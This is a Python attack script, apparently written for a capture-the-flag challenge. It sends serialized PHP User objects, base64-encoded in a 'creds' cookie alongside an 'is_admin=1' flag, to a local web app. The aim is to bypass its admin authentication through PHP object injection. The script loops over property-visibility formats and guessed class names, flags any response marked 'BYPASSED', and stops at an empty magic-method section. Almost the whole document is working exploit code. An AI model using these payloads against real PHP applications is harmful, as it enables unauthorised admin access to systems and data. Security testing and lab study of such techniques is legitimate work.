import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# Test various advanced PHP object injection techniques
print("[*] Testing advanced PHP object injection techniques...\n")

# 1. Test with explicit null bytes for protected properties
print("[*] Testing with proper protected property format...\n")

# User class with protected properties (using \x00*\x00 prefix)
user_payloads = [
    # Protected properties format
    ('User_protected', 'O:4:"User":2:{s:11:"\x00*\x00username";s:5:"admin";s:11:"\x00*\x00password";s:5:"admin";}'),
    
    # Private properties format (with class name)
    ('User_private', 'O:4:"User":2:{s:14:"\x00User\x00username";s:5:"admin";s:14:"\x00User\x00password";s:5:"admin";}'),
    
    # Try with public properties
    ('User_public', 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'),
    
    # Try with more properties
    ('User_extended', 'O:4:"User":4:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;s:4:"role";s:5:"admin";}'),
]

for name, payload in user_payloads:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_error = "Fatal error" in resp.text
    has_incomplete = "__PHP_Incomplete_Class" in resp.text
    has_rejection = "you are not the admin" in resp.text
    
    print(f"    {name}: {len(resp.content)}B")
    if has_error:
        err_match = re.search(r'(Fatal error[^<]+)', resp.text)
        if err_match:
            print(f"        Error: {err_match.group(1)[:100]}")
    if has_incomplete:
        print(f"        Note: __PHP_Incomplete_Class")
    if not has_rejection and not has_error:
        print(f"        [+] BYPASSED!")
    
print("\n" + "="*80 + "\n")

# 2. Test with different class names that might be loaded
print("[*] Testing various class names that might be autoloaded...\n")

class_names = [
    'User', 'Admin', 'Account', 'Person', 'Member', 'Customer',
    'Auth', 'Login', 'Session', 'Config', 'Database', 'DB',
    'Model', 'Controller', 'View', 'App', 'Application',
    'SimpsonUser', 'SpringfieldUser', 'Springfield', 'Burns'
]

for class_name in class_names:
    payload = f'O:{len(class_name)}:"{class_name}":2:{{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_incomplete = "__PHP_Incomplete_Class" in resp.text
    has_rejection = "you are not the admin" in resp.text
    has_error = "Fatal error" in resp.text
    
    # Check if response differs from baseline (indicates class was recognized)
    baseline_len = 3188
    
    if len(resp.content) != baseline_len or not has_incomplete:
        print(f"    {class_name}: {len(resp.content)}B (diff: {len(resp.content) - baseline_len:+d}B) {'[INCOMPLETE]' if has_incomplete else '[RECOGNIZED!]'}")
    elif has_incomplete:
        # Most will be incomplete - only print first few
        if class_name in ['User', 'Admin', 'Account']:
            print(f"    {class_name}: {len(resp.content)}B [INCOMPLETE]")

print("\n" + "="*80 + "\n")

# 3. Test with potential magic method triggers
print("[*] Testing classes with magic methods...\n")

